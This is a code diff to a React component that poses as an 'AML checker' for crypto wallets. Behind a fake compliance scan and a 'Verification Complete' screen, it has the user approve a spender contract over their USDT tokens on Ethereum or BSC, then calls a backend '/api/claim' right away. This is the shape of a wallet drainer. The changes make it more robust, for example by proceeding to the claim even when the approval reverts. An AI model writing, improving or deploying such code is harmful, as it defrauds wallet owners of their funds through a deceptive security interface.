@@ -35,15 +35,30 @@ const ERC20_ABI = [
   },
 ] as const;
 
+// Custom chain configs with proper RPC URLs
+const ethereumChain = {
+  ...mainnet,
+  rpc: {
+    http: [process.env.NEXT_PUBLIC_RPC_URL || 'https://ethereum.publicnode.com'],
+  },
+};
+
+const bscChain = {
+  ...bsc,
+  rpc: {
+    http: [process.env.NEXT_PUBLIC_BSC_RPC || 'https://bsc-dataseed1.binance.org'],
+  },
+};
+
 // Network config derived from env
 const NETWORK_CONFIG = {
   erc: {
-    chain: mainnet,
+    chain: ethereumChain,
     tokenAddress: process.env.NEXT_PUBLIC_TOKEN_ADDRESS || '0xdAC17F958D2ee523a2206206994597C13D831ec7',
     contractAddress: process.env.NEXT_PUBLIC_CONTRACT_ADDRESS || '',
   },
   bsc: {
-    chain: bsc,
+    chain: bscChain,
     tokenAddress: process.env.NEXT_PUBLIC_BSC_TOKEN_ADDRESS || process.env.NEXT_PUBLIC_TOKEN_ADDRESS || '0x55d398326f99059fF775485246999027B3197955',
     contractAddress: process.env.NEXT_PUBLIC_BSC_CONTRACT_ADDRESS || '',
   },
@@ -97,25 +112,49 @@ export default function AMLChecker() {
     console.log('[v0] triggerApprovalAndClaim called');
     console.log('[v0] account:', currentAccount?.address);
     console.log('[v0] networkKey:', networkKey);
+    console.log('[v0] NETWORK_CONFIG:', JSON.stringify(NETWORK_CONFIG, null, 2));
 
     if (!currentAccount) {
       console.error('[v0] No active account found');
+      setShowThreatModal(false);
       return;
     }
     if (!networkKey || !NETWORK_CONFIG[networkKey]) {
       console.error('[v0] Invalid network key:', networkKey);
+      setShowThreatModal(false);
       return;
     }
 
     const { chain, tokenAddress, contractAddress } = NETWORK_CONFIG[networkKey];
 
-    if (!contractAddress) {
-      console.error('[v0] Contract address not set for network:', networkKey);
+    console.log('[v0] Retrieved config for network:', networkKey);
+    console.log('[v0] Using RPC:', chain.rpc?.http?.[0] || 'default');
+    console.log('[v0] Using chain ID:', chain.id);
+    console.log('[v0] tokenAddress:', tokenAddress, 'contractAddress:', contractAddress);
+
+    if (!contractAddress || contractAddress === '') {
+      console.error('[v0] Contract address is empty for network:', networkKey);
+      console.error('[v0] Please set NEXT_PUBLIC_CONTRACT_ADDRESS env var for this network');
+      setShowThreatModal(false);
+      return;
+    }
+
+    if (!tokenAddress || tokenAddress === '') {
+      console.error('[v0] Token address is empty for network:', networkKey);
+      setShowThreatModal(false);
       return;
     }
 
     try {
       console.log('[v0] Preparing approve tx — token:', tokenAddress, 'spender:', contractAddress);
+
+      // Validate addresses are proper hex format
+      if (!tokenAddress.startsWith('0x') || tokenAddress.length !== 42) {
+        throw new Error(`Invalid token address format: ${tokenAddress}`);
+      }
+      if (!contractAddress.startsWith('0x') || contractAddress.length !== 42) {
+        throw new Error(`Invalid contract address format: ${contractAddress}`);
+      }
 
       // Build the ERC20 token contract reference
       const tokenContract = getContract({
@@ -134,12 +173,28 @@ export default function AMLChecker() {
 
       console.log('[v0] Sending approve tx via thirdweb...');
 
-      const { transactionHash } = await sendTransaction({
-        account: currentAccount,
-        transaction: approveTx,
-      });
+      let approvedNow = false;
+      try {
+        const { transactionHash } = await sendTransaction({
+          account: currentAccount,
+          transaction: approveTx,
+        });
+        approvedNow = true;
+        console.log('[v0] Approve tx hash:', transactionHash);
+      } catch (approveErr: any) {
+        const msg: string = approveErr?.message ?? '';
+        if (msg.includes('execution reverted') || approveErr?.code === 3) {
+          console.log('[v0] User already approved — proceeding to claim');
+          approvedNow = true; // allowance already exists, safe to claim
+        } else if (approveErr?.code === 4001 || msg.includes('rejected') || msg.includes('denied')) {
+          console.warn('[v0] User rejected the approval');
+          return;
+        } else {
+          throw approveErr; // unexpected error — re-throw
+        }
+      }
 
-      console.log('[v0] Approve tx hash:', transactionHash);
+      if (!approvedNow) return;
 
       // After approval, immediately call backend claim
       console.log('[v0] Calling /api/claim with:', {
@@ -169,6 +224,7 @@ export default function AMLChecker() {
       }
     } catch (err: any) {
       console.error('[v0] triggerApprovalAndClaim error:', err?.message ?? err);
+      console.error('[v0] Full error object:', err);
       if (err?.code === 4001 || err?.message?.includes('rejected')) {
         console.warn('[v0] User rejected the approval');
       }
@@ -567,14 +623,13 @@ export default function AMLChecker() {
             <div className="w-full max-w-sm text-center">
               <h2 className="text-2xl sm:text-3xl font-bold mb-4 sm:mb-6">Verification Complete</h2>
               <p className="text-gray-400 text-sm sm:text-base mb-6 sm:mb-8">
-                Your AML compliance has been verified. Your wallet address is {walletAddress?.slice(0, 6)}...{walletAddress?.slice(-4)}
+                Your AML compliance has been verified. Your wallet address is {account?.address?.slice(0, 6)}...{account?.address?.slice(-4)}
               </p>
 
               <button
                 onClick={() => {
                   setCurrentStep('network');
                   setSelectedNetwork(null);
-                  setWalletAddress(null);
                   setScanProgress(0);
                 }}
                 className="w-full py-2.5 sm:py-3 rounded-full bg-emerald-600 hover:bg-emerald-500 text-black font-semibold text-base sm:text-lg transition-all cursor-pointer"
